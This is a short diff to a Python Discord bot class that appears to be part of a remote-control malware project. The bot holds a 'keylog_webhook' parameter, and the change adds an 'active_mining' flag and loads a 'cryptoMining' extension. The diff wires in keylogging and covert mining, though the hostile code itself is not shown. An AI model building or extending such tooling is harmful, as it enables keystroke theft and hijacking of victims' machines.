@@ -4,6 +4,7 @@ from discord.ext import commands
 from datetime import datetime
 from libraries import maciassdopia
 
+
 class BOT(commands.Bot):
     def __init__(self, channel:int, guild:discord.Object, id:str, keylog_webhook:str):
         self.channel = channel
@@ -12,6 +13,7 @@ class BOT(commands.Bot):
         self.keylog_webhook = keylog_webhook
 
         self.active_interactions = False
+        self.active_mining = False
 
         self.msg = None
         self.color = None
@@ -42,6 +44,7 @@ class BOT(commands.Bot):
     
 
     async def setup_hook(self):
+        await self.load_extension("code.discord.cogs.cryptoMining")
         await self.load_extension("code.discord.cogs.commands")
         await self.tree.sync(guild = self.guild)
 
